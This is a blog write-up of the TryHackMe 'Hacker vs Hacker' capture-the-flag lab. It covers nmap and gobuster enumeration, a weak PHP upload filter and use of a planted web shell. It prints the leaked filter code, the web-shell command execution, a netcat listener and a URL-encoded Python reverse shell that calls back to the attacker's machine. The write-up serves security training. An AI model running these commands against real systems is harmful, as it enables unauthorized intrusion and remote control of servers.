---
title: "TryHackMe: Hacker vs Hacker"
author: cilgin
date: 2025-06-18 02:11:36 +0300
categories: [CyberSecurity]
tags: [CTF, TryHackMe, Easy]
pin: true
math: false
mermaid: false
image:
  path: /assets/img/2025-06-18-TryHackMe-Hacker_vs_Hacker/Hacker_vs_Hacker.png
---

# Enumeration

## Nmap Scan

I start with exporting the target machine IP adress as a enviroment variable:

```bash
export IP=10.10.42.44
```

And running `nmap` scan on the target:

```bash
nmap -T4 -n -sC -sV -Pn -p- $IP
Starting Nmap 7.97 ( https://nmap.org ) at 2025-06-18 12:43 +0300
Nmap scan report for 10.10.42.44
Host is up (0.074s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c (RSA)
|   256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c (ECDSA)
|_  256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: RecruitSec: Industry Leading Infosec Recruitment
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.66 seconds
```

There are **3** open ports:

- **22** `ssh`
- **80** `http`

## Directory Fuzzing

For further enumeration I'm gonna run `gobuster`.

```bash
❯ gobuster dir -w common.txt -u http://$IP/ -x md,js,html,php,py,css,txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.42.44/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              py,css,txt,md,js,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.hta.php             (Status: 403) [Size: 276]
/.hta.py              (Status: 403) [Size: 276]
/.hta.css             (Status: 403) [Size: 276]
/.hta.txt             (Status: 403) [Size: 276]
/.hta.js              (Status: 403) [Size: 276]
/.hta.md              (Status: 403) [Size: 276]
/.hta.html            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htaccess.py         (Status: 403) [Size: 276]
/.htaccess.css        (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.htaccess.md         (Status: 403) [Size: 276]
/.htaccess.js         (Status: 403) [Size: 276]
/.htaccess.html       (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htpasswd.html       (Status: 403) [Size: 276]
/.htpasswd.js         (Status: 403) [Size: 276]
/.htpasswd.py         (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/.htpasswd.css        (Status: 403) [Size: 276]
/.htpasswd.md         (Status: 403) [Size: 276]
/css                  (Status: 301) [Size: 308] [--> http://10.10.42.44/css/]
/cvs                  (Status: 301) [Size: 308] [--> http://10.10.42.44/cvs/]
/dist                 (Status: 301) [Size: 309] [--> http://10.10.42.44/dist/]
/images               (Status: 301) [Size: 311] [--> http://10.10.42.44/images/]
/index.html           (Status: 200) [Size: 3413]
/index.html           (Status: 200) [Size: 3413]
/server-status        (Status: 403) [Size: 276]
/upload.php           (Status: 200) [Size: 552]
Progress: 37912 / 37912 (100.00%)
===============================================================
Finished
===============================================================
```

There is file `/upload.php`{: .filepath} maybe we can use this file.

## Enumerating path's

```bash
curl http://$IP/upload.php
Hacked! If you dont want me to upload my shell, do better at filtering!

<!-- seriously, dumb stuff:

$target_dir = "cvs/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

if (!strpos($target_file, ".pdf")) {
  echo "Only PDF CVs are accepted.";
} else if (file_exists($target_file)) {
  echo "This CV has already been uploaded!";
} else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
  echo "Success! We will get back to you.";
} else {
  echo "Something went wrong :|";
}
```

Also there is upload section on the page. `photo`

We can use this file make a reverse shell to the machine.

I used pentestmonkey php reverse shell. With `.php`, `.pdf`, `.pdf.php` and `.php.pdf`. But none of them worked. Maybe we need to do something with this file.

So I back to the directory fuzzing. And fuzzed the cvs directory with .pdf.php extension.

```bash
❯ gobuster dir -w common.txt -u http://$IP/cvs/ -x pdf.php -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.42.44/cvs/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              pdf.php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.hta.pdf.php         (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htaccess.pdf.php    (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htpasswd.pdf.php    (Status: 403) [Size: 276]
/index.html           (Status: 200) [Size: 26]
/shell.pdf.php        (Status: 200) [Size: 18]
Progress: 9478 / 9478 (100.00%)
===============================================================
Finished
===============================================================
```

And as you can see there is a `/shell.pdf.php`{: .filepath} file.

- We can try making basic php enumeration using:

```bash
curl http://$IP/cvs/shell.pdf.php?cmd=id
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
boom!%
```

We can access the shell.

## Gaining Reverse Shell

- On my machine I runned `nc -lvnp 4444`.

- For target I open with my browser `http://10.10.42.44/cvs/shell.pdf.php?cmd=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.21.206.128%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22sh%22%29%27`
You can use <revshells.com>
